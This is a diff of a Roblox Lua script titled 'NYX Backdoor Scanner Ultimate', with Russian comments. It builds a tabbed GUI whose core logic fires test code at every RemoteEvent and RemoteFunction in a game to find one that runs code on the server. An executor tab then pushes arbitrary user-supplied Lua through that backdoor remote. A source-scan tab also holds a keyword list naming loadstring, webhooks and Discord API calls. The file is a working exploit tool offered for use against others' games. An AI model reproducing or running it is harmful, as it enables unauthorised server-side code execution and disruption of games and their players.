@@ -19,8 +19,8 @@ G2L["1"]["ResetOnSpawn"] = false;
 -- StarterGui.NYX Scanner.Frame
 G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276);
-G2L["2"]["Position"] = UDim2.new(0.273, 0, 0.302, 0);
+G2L["2"]["Size"] = UDim2.new(0, 500, 0, 320);
+G2L["2"]["Position"] = UDim2.new(0.27, 0, 0.3, 0);
 
 -- UIStroke
 G2L["3"] = Instance.new("UIStroke", G2L["2"]);
@@ -37,178 +37,253 @@ G2L["4"]["Color"] = ColorSequence.new{
 -- UICorner
 G2L["5"] = Instance.new("UICorner", G2L["2"]);
 
--- Executor Folder
-G2L["6"] = Instance.new("Folder", G2L["2"]);
-G2L["6"]["Name"] = [[Executor]];
+-- Вкладки
+G2L["tabFrame"] = Instance.new("Frame", G2L["2"]);
+G2L["tabFrame"]["Size"] = UDim2.new(1, 0, 0, 30);
+G2L["tabFrame"]["Position"] = UDim2.new(0, 0, 0, 0);
+G2L["tabFrame"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
+G2L["tabFrame"]["BorderSizePixel"] = 0;
 
--- Execute Frame
-G2L["7"] = Instance.new("Frame", G2L["6"]);
-G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7"]["BackgroundTransparency"] = 1;
-G2L["7"]["Size"] = UDim2.new(0, 290, 0, 28);
-G2L["7"]["Position"] = UDim2.new(0.022, 0, 0.871, 0);
-G2L["7"]["Name"] = [[Execute]];
+-- Вкладка Scanner
+G2L["scanTab"] = Instance.new("TextButton", G2L["tabFrame"]);
+G2L["scanTab"]["Size"] = UDim2.new(0, 125, 1, 0);
+G2L["scanTab"]["BackgroundColor3"] = Color3.fromRGB(0, 100, 0);
+G2L["scanTab"]["Text"] = "SCANNER";
+G2L["scanTab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["scanTab"]["Font"] = Enum.Font.Code;
+G2L["scanTab"]["TextSize"] = 12;
 
--- Execute Button
-G2L["8"] = Instance.new("TextButton", G2L["7"]);
-G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8"]["TextSize"] = 22;
-G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["8"]["TextColor3"] = Color3.fromRGB(51, 215, 0);
-G2L["8"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["8"]["Name"] = [[Button]];
-G2L["8"]["Text"] = [[Execute]];
-G2L["8"]["BackgroundTransparency"] = 1;
+-- Вкладка Source
+G2L["sourceTab"] = Instance.new("TextButton", G2L["tabFrame"]);
+G2L["sourceTab"]["Size"] = UDim2.new(0, 125, 1, 0);
+G2L["sourceTab"]["Position"] = UDim2.new(0, 125, 0, 0);
+G2L["sourceTab"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
+G2L["sourceTab"]["Text"] = "SOURCE";
+G2L["sourceTab"]["TextColor3"] = Color3.fromRGB(150, 150, 150);
+G2L["sourceTab"]["Font"] = Enum.Font.Code;
+G2L["sourceTab"]["TextSize"] = 12;
 
--- Execute UICorner
-G2L["9"] = Instance.new("UICorner", G2L["7"]);
+-- Вкладка Executor
+G2L["execTab"] = Instance.new("TextButton", G2L["tabFrame"]);
+G2L["execTab"]["Size"] = UDim2.new(0, 125, 1, 0);
+G2L["execTab"]["Position"] = UDim2.new(0, 250, 0, 0);
+G2L["execTab"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
+G2L["execTab"]["Text"] = "EXECUTOR";
+G2L["execTab"]["TextColor3"] = Color3.fromRGB(150, 150, 150);
+G2L["execTab"]["Font"] = Enum.Font.Code;
+G2L["execTab"]["TextSize"] = 12;
 
--- Execute UIStroke
-G2L["a"] = Instance.new("UIStroke", G2L["7"]);
-G2L["a"]["Color"] = Color3.fromRGB(51, 215, 0);
+-- Вкладка Logs
+G2L["logsTab"] = Instance.new("TextButton", G2L["tabFrame"]);
+G2L["logsTab"]["Size"] = UDim2.new(0, 125, 1, 0);
+G2L["logsTab"]["Position"] = UDim2.new(0, 375, 0, 0);
+G2L["logsTab"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
+G2L["logsTab"]["Text"] = "LOGS";
+G2L["logsTab"]["TextColor3"] = Color3.fromRGB(150, 150, 150);
+G2L["logsTab"]["Font"] = Enum.Font.Code;
+G2L["logsTab"]["TextSize"] = 12;
 
--- Clear Frame
-G2L["b"] = Instance.new("Frame", G2L["6"]);
-G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b"]["BackgroundTransparency"] = 1;
-G2L["b"]["Size"] = UDim2.new(0, 162, 0, 28);
-G2L["b"]["Position"] = UDim2.new(0.64, 0, 0.871, 0);
-G2L["b"]["Name"] = [[Clear]];
-
--- Clear Button
-G2L["c"] = Instance.new("TextButton", G2L["b"]);
-G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c"]["TextSize"] = 22;
-G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["c"]["TextColor3"] = Color3.fromRGB(255, 100, 100);
-G2L["c"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["c"]["Name"] = [[Button]];
-G2L["c"]["Text"] = [[Clear]];
-G2L["c"]["BackgroundTransparency"] = 1;
-
--- Clear UICorner
-G2L["d"] = Instance.new("UICorner", G2L["b"]);
-
--- Clear UIStroke
-G2L["e"] = Instance.new("UIStroke", G2L["b"]);
-G2L["e"]["Color"] = Color3.fromRGB(255, 100, 100);
-
--- ExecutorBox Frame
-G2L["f"] = Instance.new("Frame", G2L["6"]);
-G2L["f"]["BackgroundColor3"] = Color3.fromRGB(22, 22, 22);
-G2L["f"]["Size"] = UDim2.new(0, 462, 0, 163);
-G2L["f"]["Position"] = UDim2.new(0.02, 0, 0.243, 0);
-G2L["f"]["Name"] = [[ExecutorBox]];
-
--- ExecutorBox UICorner
-G2L["10"] = Instance.new("UICorner", G2L["f"]);
-
--- TextBox
-G2L["11"] = Instance.new("TextBox", G2L["f"]);
-G2L["11"]["TextSize"] = 14;
-G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["11"]["TextWrapped"] = true;
-G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["11"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
-G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["11"]["MultiLine"] = true;
-G2L["11"]["BackgroundTransparency"] = 1;
-G2L["11"]["PlaceholderText"] = [[require(77055143496081).MorphMonster("fgrwerlgh", "shin sonic")]];
-G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
-G2L["11"]["Text"] = [[]];
-G2L["11"]["Position"] = UDim2.new(0.016, 0, 0.042, 0);
-G2L["11"]["ClearTextOnFocus"] = false;
-
--- Scanner Frame
-G2L["16"] = Instance.new("Frame", G2L["2"]);
-G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["16"]["BackgroundTransparency"] = 1;
-G2L["16"]["Size"] = UDim2.new(0, 370, 0, 107);
-G2L["16"]["Position"] = UDim2.new(0.117, 0, 0.305, 0);
-G2L["16"]["Visible"] = true;
-G2L["16"]["Name"] = [[Scanner]];
-
--- Scanner UIStroke
-G2L["17"] = Instance.new("UIStroke", G2L["16"]);
-G2L["17"]["Color"] = Color3.fromRGB(255, 255, 255);
-
--- Scanner UIGradient
-G2L["18"] = Instance.new("UIGradient", G2L["17"]);
-G2L["18"]["Rotation"] = 50;
-G2L["18"]["Color"] = ColorSequence.new{
-    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 255, 0)),
-    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 200))
-};
-
--- Scanner UICorner
-G2L["19"] = Instance.new("UICorner", G2L["16"]);
-
--- Scanner Button
-G2L["1a"] = Instance.new("TextButton", G2L["16"]);
-G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1a"]["TextSize"] = 43;
-G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["1a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1a"]["Name"] = [[Button]];
-G2L["1a"]["Text"] = [[Start Scanning]];
-G2L["1a"]["BackgroundTransparency"] = 1;
-
--- Scanner Button UIGradient
-G2L["1b"] = Instance.new("UIGradient", G2L["1a"]);
-G2L["1b"]["Rotation"] = 50;
-G2L["1b"]["Color"] = ColorSequence.new{
-    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 255, 0)),
-    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 200))
-};
-
--- Scanner Button UIStroke
-G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
-G2L["1c"]["Color"] = Color3.fromRGB(255, 255, 255);
-
--- Title Label
-G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
-G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["1d"]["TextSize"] = 30;
-G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d"]["Size"] = UDim2.new(0, 460, 0, 50);
-G2L["1d"]["Text"] = [[NYX BACKDOOR SCANNER]];
-G2L["1d"]["BackgroundTransparency"] = 1;
-G2L["1d"]["Position"] = UDim2.new(0.022, 0, 0.025, 0);
-
--- Title UIStroke
-G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
-G2L["1e"]["Color"] = Color3.fromRGB(255, 255, 255);
-
--- Title UIGradient
-G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
-G2L["1f"]["Rotation"] = 50;
-G2L["1f"]["Color"] = ColorSequence.new{
-    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 255, 0)),
-    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 200))
-};
-
--- Dragify LocalScript
-G2L["21"] = Instance.new("LocalScript", G2L["1"]);
-G2L["21"]["Name"] = [[Dragify]];
+-- Контент
+G2L["content"] = Instance.new("Frame", G2L["2"]);
+G2L["content"]["Size"] = UDim2.new(1, -20, 0, 230);
+G2L["content"]["Position"] = UDim2.new(0, 10, 0, 40);
+G2L["content"]["BackgroundTransparency"] = 1;
 
 -- ============================================================================
--- ЛОГИКА NYX SCANNER
+-- SCANNER FRAME
 -- ============================================================================
+G2L["scannerFrame"] = Instance.new("Frame", G2L["content"]);
+G2L["scannerFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["scannerFrame"]["BackgroundTransparency"] = 1;
 
-local GUI = G2L["2"]
+G2L["scanBtn"] = Instance.new("TextButton", G2L["scannerFrame"]);
+G2L["scanBtn"]["Size"] = UDim2.new(0, 200, 0, 40);
+G2L["scanBtn"]["Position"] = UDim2.new(0.5, -100, 0, 20);
+G2L["scanBtn"]["BackgroundColor3"] = Color3.fromRGB(0, 100, 0);
+G2L["scanBtn"]["Text"] = "START SCANNING";
+G2L["scanBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["scanBtn"]["Font"] = Enum.Font.Code;
+G2L["scanBtn"]["TextSize"] = 16;
+
+G2L["scanStatus"] = Instance.new("TextLabel", G2L["scannerFrame"]);
+G2L["scanStatus"]["Size"] = UDim2.new(1, 0, 0, 30);
+G2L["scanStatus"]["Position"] = UDim2.new(0, 0, 1, -30);
+G2L["scanStatus"]["BackgroundTransparency"] = 1;
+G2L["scanStatus"]["Text"] = "Ready. Press START SCANNING.";
+G2L["scanStatus"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["scanStatus"]["Font"] = Enum.Font.Code;
+G2L["scanStatus"]["TextSize"] = 12;
+G2L["scanStatus"]["TextXAlignment"] = Enum.TextXAlignment.Center;
+
+-- ============================================================================
+-- SOURCE FRAME
+-- ============================================================================
+G2L["sourceFrame"] = Instance.new("Frame", G2L["content"]);
+G2L["sourceFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["sourceFrame"]["BackgroundTransparency"] = 1;
+G2L["sourceFrame"]["Visible"] = false;
+
+G2L["sourceBtn"] = Instance.new("TextButton", G2L["sourceFrame"]);
+G2L["sourceBtn"]["Size"] = UDim2.new(0, 200, 0, 40);
+G2L["sourceBtn"]["Position"] = UDim2.new(0.5, -100, 0, 20);
+G2L["sourceBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 0, 100);
+G2L["sourceBtn"]["Text"] = "ANALYZE SOURCE";
+G2L["sourceBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["sourceBtn"]["Font"] = Enum.Font.Code;
+G2L["sourceBtn"]["TextSize"] = 16;
+
+G2L["sourceStatus"] = Instance.new("TextLabel", G2L["sourceFrame"]);
+G2L["sourceStatus"]["Size"] = UDim2.new(1, 0, 0, 30);
+G2L["sourceStatus"]["Position"] = UDim2.new(0, 0, 1, -30);
+G2L["sourceStatus"]["BackgroundTransparency"] = 1;
+G2L["sourceStatus"]["Text"] = "Ready. Press ANALYZE SOURCE.";
+G2L["sourceStatus"]["TextColor3"] = Color3.fromRGB(255, 150, 0);
+G2L["sourceStatus"]["Font"] = Enum.Font.Code;
+G2L["sourceStatus"]["TextSize"] = 12;
+G2L["sourceStatus"]["TextXAlignment"] = Enum.TextXAlignment.Center;
+
+-- ============================================================================
+-- EXECUTOR FRAME
+-- ============================================================================
+G2L["executorFrame"] = Instance.new("Frame", G2L["content"]);
+G2L["executorFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["executorFrame"]["BackgroundTransparency"] = 1;
+G2L["executorFrame"]["Visible"] = false;
+
+G2L["scriptBox"] = Instance.new("TextBox", G2L["executorFrame"]);
+G2L["scriptBox"]["Size"] = UDim2.new(1, 0, 0, 150);
+G2L["scriptBox"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
+G2L["scriptBox"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["scriptBox"]["Font"] = Enum.Font.Code;
+G2L["scriptBox"]["TextSize"] = 13;
+G2L["scriptBox"]["MultiLine"] = true;
+G2L["scriptBox"]["Text"] = "";
+G2L["scriptBox"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["scriptBox"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+
+G2L["execBtn"] = Instance.new("TextButton", G2L["executorFrame"]);
+G2L["execBtn"]["Size"] = UDim2.new(0, 150, 0, 30);
+G2L["execBtn"]["Position"] = UDim2.new(0, 0, 0, 160);
+G2L["execBtn"]["BackgroundColor3"] = Color3.fromRGB(0, 100, 0);
+G2L["execBtn"]["Text"] = "EXECUTE";
+G2L["execBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["execBtn"]["Font"] = Enum.Font.Code;
+G2L["execBtn"]["TextSize"] = 14;
+
+G2L["copyBtn"] = Instance.new("TextButton", G2L["executorFrame"]);
+G2L["copyBtn"]["Size"] = UDim2.new(0, 150, 0, 30);
+G2L["copyBtn"]["Position"] = UDim2.new(0, 160, 0, 160);
+G2L["copyBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 100, 0);
+G2L["copyBtn"]["Text"] = "COPY";
+G2L["copyBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["copyBtn"]["Font"] = Enum.Font.Code;
+G2L["copyBtn"]["TextSize"] = 14;
+
+G2L["clearBtn"] = Instance.new("TextButton", G2L["executorFrame"]);
+G2L["clearBtn"]["Size"] = UDim2.new(0, 150, 0, 30);
+G2L["clearBtn"]["Position"] = UDim2.new(0, 320, 0, 160);
+G2L["clearBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 0, 0);
+G2L["clearBtn"]["Text"] = "CLEAR";
+G2L["clearBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["clearBtn"]["Font"] = Enum.Font.Code;
+G2L["clearBtn"]["TextSize"] = 14;
+
+G2L["execStatus"] = Instance.new("TextLabel", G2L["executorFrame"]);
+G2L["execStatus"]["Size"] = UDim2.new(1, 0, 0, 30);
+G2L["execStatus"]["Position"] = UDim2.new(0, 0, 1, -30);
+G2L["execStatus"]["BackgroundTransparency"] = 1;
+G2L["execStatus"]["Text"] = "";
+G2L["execStatus"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["execStatus"]["Font"] = Enum.Font.Code;
+G2L["execStatus"]["TextSize"] = 12;
+
+-- ============================================================================
+-- LOGS FRAME
+-- ============================================================================
+G2L["logsFrame"] = Instance.new("Frame", G2L["content"]);
+G2L["logsFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["logsFrame"]["BackgroundTransparency"] = 1;
+G2L["logsFrame"]["Visible"] = false;
+
+G2L["logsBox"] = Instance.new("TextBox", G2L["logsFrame"]);
+G2L["logsBox"]["Size"] = UDim2.new(1, 0, 0, 190);
+G2L["logsBox"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15);
+G2L["logsBox"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["logsBox"]["Font"] = Enum.Font.Code;
+G2L["logsBox"]["TextSize"] = 11;
+G2L["logsBox"]["MultiLine"] = true;
+G2L["logsBox"]["Text"] = "=== NYX SCANNER LOGS ===\n\n";
+G2L["logsBox"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["logsBox"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+
+G2L["clearLogsBtn"] = Instance.new("TextButton", G2L["logsFrame"]);
+G2L["clearLogsBtn"]["Size"] = UDim2.new(0, 100, 0, 25);
+G2L["clearLogsBtn"]["Position"] = UDim2.new(1, -100, 0, 200);
+G2L["clearLogsBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 0, 0);
+G2L["clearLogsBtn"]["Text"] = "CLEAR";
+G2L["clearLogsBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["clearLogsBtn"]["Font"] = Enum.Font.Code;
+G2L["clearLogsBtn"]["TextSize"] = 11;
+
+-- Title
+G2L["title"] = Instance.new("TextLabel", G2L["2"]);
+G2L["title"]["Size"] = UDim2.new(1, 0, 0, 30);
+G2L["title"]["Position"] = UDim2.new(0, 0, 1, -30);
+G2L["title"]["BackgroundTransparency"] = 1;
+G2L["title"]["Text"] = "NYX BACKDOOR SCANNER ULTIMATE";
+G2L["title"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
+G2L["title"]["Font"] = Enum.Font.Code;
+G2L["title"]["TextSize"] = 12;
+G2L["title"]["TextXAlignment"] = Enum.TextXAlignment.Center;
+
+-- Close button
+G2L["close"] = Instance.new("TextButton", G2L["2"]);
+G2L["close"]["Size"] = UDim2.new(0, 30, 0, 30);
+G2L["close"]["Position"] = UDim2.new(1, -30, 0, 0);
+G2L["close"]["BackgroundColor3"] = Color3.fromRGB(200, 50, 50);
+G2L["close"]["Text"] = "X";
+G2L["close"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["close"]["Font"] = Enum.Font.Code;
+G2L["close"]["TextSize"] = 16;
+G2L["close"]["MouseButton1Click"]:Connect(function() G2L["1"]:Destroy() end);
+
+-- Dragify
+local UIS = game:GetService("UserInputService")
+local dragToggle, dragStart, startPos
+local main = G2L["2"]
+local titleBar = G2L["tabFrame"]
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragToggle = true
+        dragStart = input.Position
+        startPos = main.Position
+    end
+end)
+titleBar.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragToggle = false
+    end
+end)
+UIS.InputChanged:Connect(function(input)
+    if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local d = input.Position - dragStart
+        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+    end
+end)
+
+-- ============================================================================
+-- ЛОГИКА
+-- ============================================================================
+local player = game.Players.LocalPlayer
 local backdoor = nil
 local searching = false
-local player = game.Players.LocalPlayer
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
 
--- Скрываем Executor при старте
-for _, v in ipairs(G2L["6"]:GetDescendants()) do
-    if v:IsA("Frame") then v.Visible = false end
+local function addLog(text)
+    G2L["logsBox"].Text = G2L["logsBox"].Text .. "[" .. os.date("%H:%M:%S") .. "] " .. text .. "\n"
 end
 
--- Функция уведомления
 local function notify(text)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
@@ -219,138 +294,174 @@ local function notify(text)
     end)
 end
 
--- Функция сканирования
-local function scanBackdoors()
-    local found = {}
-    local kw = {"admin", "backdoor", "exploit", "bypass", "remote", "fire", "exec", "cmd", "c00l", "nyx", "fe", "skid", "hd", "rage", "kill", "ban", "kick", "tp", "teleport", "god", "esp"}
-    
-    for _, v in ipairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-            local n = v.Name:lower()
-            local pn = v.Parent and v.Parent.Name:lower() or ""
-            for _, k in ipairs(kw) do
-                if n:find(k) or pn:find(k) then
-                    table.insert(found, v:GetFullName())
-                    break
-                end
-            end
-        elseif v:IsA("ModuleScript") then
-            local n = v.Name:lower()
-            for _, k in ipairs(kw) do
-                if n:find(k) then
-                    table.insert(found, "[Module] " .. v:GetFullName())
-                    break
-                end
-            end
-        end
-    end
-    
-    return found
+local function generateName(len)
+    local t = ''
+    for i = 1, len do t = t .. alphabet[math.random(1, #alphabet)] end
+    return t
 end
 
--- Кнопка SCAN
-G2L["1a"].MouseButton1Click:Connect(function()
-    if searching then return end
-    searching = true
-    G2L["1a"].Text = "Scanning..."
+local function runRemote(remote, data)
+    if remote:IsA('RemoteEvent') then
+        remote:FireServer(data)
+    elseif remote:IsA('RemoteFunction') then
+        spawn(function() remote:InvokeServer(data) end)
+    end
+end
+
+-- Сканер бэкдоров (оригинальный метод LALOL)
+local function findRemote()
+    local timee = os.clock()
+    local remotes = {}
     
-    local bd = scanBackdoors()
-    
-    if #bd > 0 then
-        notify("This is admin event, Enjoy! Found " .. #bd .. " backdoors!")
-        print("========== THIS IS ADMIN EVENT, ENJOY! ==========")
-        for i, v in ipairs(bd) do print(i .. ". " .. v) end
-        print("=================================================")
-        G2L["16"].Visible = false
-        for _, v in ipairs(G2L["6"]:GetDescendants()) do
-            if v:IsA("Frame") then v.Visible = true end
+    for _, remote in ipairs(game:GetDescendants()) do
+        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
+            if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then continue end
+            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then continue end
+            if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' then continue end
+            if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then continue end
+            
+            local code = generateName(math.random(12, 30))
+            while remotes[code] do code = generateName(math.random(12, 30)) end
+            
+            runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+            remotes[code] = remote
         end
-    else
-        G2L["1a"].Text = "No backdoor :("
-        notify("No backdoors found.")
-        task.wait(2)
-        G2L["1a"].Text = "Start Scanning"
     end
     
+    for i = 1, 100 do
+        for code, remote in pairs(remotes) do
+            if workspace:FindFirstChild(code) then
+                backdoor = remote
+                notify("Backdoor found! " .. remote:GetFullName())
+                addLog("Backdoor found: " .. remote:GetFullName())
+                return true
+            end
+        end
+        wait()
+    end
+    
+    return false
+end
+
+-- Source Scan
+local function sourceScan()
+    local found = {}
+    local dangerous = {"require", "loadstring", "getfenv", "setfenv", "http_request", "syn.request", "HttpService", "webhook", "discord.com/api"}
+    
+    for _, v in ipairs(game:GetDescendants()) do
+        if v:IsA("LuaSourceContainer") then
+            local src = v.Source
+            for id in string.gmatch(src, "require%s*%(%s*(%d+)%s*%)") do
+                table.insert(found, v:GetFullName() .. " -> require(" .. id .. ")")
+            end
+            for _, fn in ipairs(dangerous) do
+                if string.find(src, fn) then
+                    table.insert(found, v:GetFullName() .. " -> " .. fn)
+                end
+            end
+        end
+    end
+    
+    if #found > 0 then
+        print("========== SOURCE SCAN RESULTS ==========")
+        for i, v in ipairs(found) do print(i .. ". " .. v) end
+        print("=========================================")
+        notify("Found " .. #found .. " suspicious patterns!")
+        addLog("Source scan: " .. #found .. " patterns found")
+    else
+        notify("No suspicious code found.")
+        addLog("Source scan: clean")
+    end
+end
+
+-- Переключение вкладок
+local tabs = {
+    {btn = G2L["scanTab"], frame = G2L["scannerFrame"]},
+    {btn = G2L["sourceTab"], frame = G2L["sourceFrame"]},
+    {btn = G2L["execTab"], frame = G2L["executorFrame"]},
+    {btn = G2L["logsTab"], frame = G2L["logsFrame"]}
+}
+
+for _, tab in ipairs(tabs) do
+    tab.btn.MouseButton1Click:Connect(function()
+        for _, t in ipairs(tabs) do
+            t.frame.Visible = false
+            t.btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+            t.btn.TextColor3 = Color3.fromRGB(150, 150, 150)
+        end
+        tab.frame.Visible = true
+        tab.btn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+        tab.btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end)
+end
+
+-- Кнопки
+G2L["scanBtn"].MouseButton1Click:Connect(function()
+    if searching then return end
+    searching = true
+    G2L["scanBtn"].Text = "SCANNING..."
+    G2L["scanStatus"].Text = "Scanning for backdoors..."
+    addLog("Scan started")
+    
+    if findRemote() then
+        G2L["scanStatus"].Text = "Backdoor found! Go to EXECUTOR tab."
+        G2L["scanBtn"].Text = "FOUND!"
+    else
+        G2L["scanStatus"].Text = "No backdoor found :("
+        G2L["scanBtn"].Text = "NO BACKDOOR"
+        addLog("Scan: no backdoor found")
+    end
     searching = false
 end)
 
--- Кнопка EXECUTE
-G2L["8"].MouseButton1Click:Connect(function()
-    local code = G2L["11"].Text
-    if code ~= "" then
-        -- Заменяем %username%
-        code = string.gsub(code, "%%username%%", player.Name)
-        
-        -- Выполняем
-        local success, err = pcall(loadstring(code))
-        if success then
-            G2L["8"].Text = "Executed!"
-            notify("Script executed!")
-        else
-            G2L["8"].Text = "Error!"
-            warn("Error: " .. tostring(err))
-        end
-        task.wait(1)
-        G2L["8"].Text = "Execute"
+G2L["sourceBtn"].MouseButton1Click:Connect(function()
+    G2L["sourceStatus"].Text = "Analyzing source code..."
+    sourceScan()
+    G2L["sourceStatus"].Text = "Done. Check console (F9)."
+end)
+
+G2L["execBtn"].MouseButton1Click:Connect(function()
+    local code = G2L["scriptBox"].Text
+    if code == "" then
+        G2L["execStatus"].Text = "No script!"
+        return
+    end
+    
+    code = string.gsub(code, "%%username%%", player.Name)
+    
+    if backdoor then
+        runRemote(backdoor, code)
+        G2L["execStatus"].Text = "Executed!"
+        addLog("Script executed")
+    else
+        G2L["execStatus"].Text = "No backdoor! Scan first."
     end
 end)
 
--- Кнопка CLEAR
-G2L["c"].MouseButton1Click:Connect(function()
-    G2L["11"].Text = ""
-    G2L["c"].Text = "Cleared!"
-    task.wait(0.5)
-    G2L["c"].Text = "Clear"
-end)
-
--- Dragify
-local UIS = game:GetService("UserInputService")
-local dragToggle, dragInput, dragStart, startPos
-
-local function updateInput(input)
-    local Delta = input.Position - dragStart
-    local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
-    game:GetService("TweenService"):Create(GUI, TweenInfo.new(0.15), {Position = Position}):Play()
-end
-
-GUI.InputBegan:Connect(function(input)
-    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
-        dragToggle = true
-        dragStart = input.Position
-        startPos = GUI.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragToggle = false
-            end
-        end)
+G2L["copyBtn"].MouseButton1Click:Connect(function()
+    if G2L["scriptBox"].Text ~= "" then
+        print("========== COPY THIS ==========")
+        print(G2L["scriptBox"].Text)
+        print("===============================")
+        G2L["execStatus"].Text = "Copied to F9!"
     end
 end)
 
-GUI.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
+G2L["clearBtn"].MouseButton1Click:Connect(function()
+    G2L["scriptBox"].Text = ""
+    G2L["execStatus"].Text = "Cleared."
 end)
 
-UIS.InputChanged:Connect(function(input)
-    if input == dragInput and dragToggle then
-        updateInput(input)
-    end
+G2L["clearLogsBtn"].MouseButton1Click:Connect(function()
+    G2L["logsBox"].Text = "=== NYX SCANNER LOGS ===\n\n"
 end)
 
--- Горячая клавиша LeftAlt
-UIS.InputBegan:Connect(function(input, processed)
